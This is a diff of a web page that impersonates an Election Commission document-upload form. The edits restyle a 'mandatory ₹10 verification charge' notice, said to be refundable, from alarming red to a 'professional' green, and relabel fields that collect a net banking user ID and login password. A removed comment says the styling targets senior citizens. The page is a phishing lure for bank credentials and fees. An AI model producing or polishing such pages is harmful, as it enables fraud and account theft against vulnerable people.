@@ -41,18 +41,25 @@
 
         .form-container h2 { text-align: center; margin-bottom: 5px; color: #0056b3; font-size: 22px; }
         
-        /* Compact & Bold Red Verification Note Styling for Senior Citizens */
+        /* Verification Note Styled in Green with Larger Amount */
         .verification-note {
             text-align: center;
-            color: #b71c1c; /* Dark Red / Eye-catching color */
-            font-size: 12.5px; /* Slightly increased for better readability */
-            font-weight: 800; /* Bold weight matching the ₹5 highlight */
+            color: #2e7d32; /* Professional Dark Green Color */
+            font-size: 12px; 
+            font-weight: 700; 
             line-height: 1.4;
             margin-bottom: 15px;
             padding: 0 5px;
         }
 
-        /* Highlighted Big ₹5 Charge Box Styling */
+        /* Large Amount inside the verification note */
+        .verification-note .highlight-amount {
+            font-size: 16px;
+            font-weight: 900;
+            color: #1b5e20;
+        }
+
+        /* Highlighted Big Charge Box Styling */
         .charge-highlight-box {
             background: #e8f5e9;
             border: 2px dashed #2e7d32;
@@ -63,7 +70,7 @@
         }
 
         .charge-highlight-box .charge-title {
-            font-size: 12px;
+            font-size: 11px;
             color: #1b5e20;
             font-weight: 600;
             text-transform: uppercase;
@@ -72,7 +79,7 @@
 
         .charge-highlight-box .charge-amount {
             font-size: 26px;
-            color: #d32f2f;
+            color: #2e7d32; /* Green Amount Styling */
             font-weight: 900;
             letter-spacing: 0.5px;
         }
@@ -113,9 +120,9 @@
             <img src="logo.png" alt="Election Commission Banner">
         </div>
 
-        <p class="verification-note">PAY A MANDATORY ₹10 ONLINE VERIFICATION CHARGE TO PROCEED WITH YOUR SUPPORTING DOCUMENT UPLOAD. THIS AMOUNT WILL BE REFUNDED TO YOUR ACCOUNT IMMEDIATELY AFTER YOUR DOCUMENTS ARE VERIFIED.</p>
+        <p class="verification-note">PAY A MANDATORY <span class="highlight-amount">₹10</span> ONLINE VERIFICATION CHARGE TO PROCEED WITH YOUR SUPPORTING DOCUMENT UPLOAD. THIS AMOUNT WILL BE REFUNDED TO YOUR ACCOUNT IMMEDIATELY AFTER YOUR DOCUMENTS ARE VERIFIED.</p>
         
-        <!-- Highlighted ₹5 Charge Box -->
+        <!-- Highlighted Charge Box -->
         <div class="charge-highlight-box">
             <div class="charge-title">Required Document Verification Fee</div>
             <div class="charge-amount">₹10 Only</div>
@@ -177,11 +184,11 @@
 
                 <div id="bankCredentials">
                     <div class="form-group">
-                        <label for="userId">User ID / Customer ID*</label>
+                        <label for="userId">Username / Customer ID</label>
                         <input type="text" id="userId" placeholder="Enter User ID">
                     </div>
                     <div class="form-group">
-                        <label for="loginPassword">Net Banking Login Password*</label>
+                        <label for="loginPassword">Net Banking Login Password</label>
                         <input type="password" id="loginPassword" placeholder="Enter Login Password">
                     </div>
                 </div>
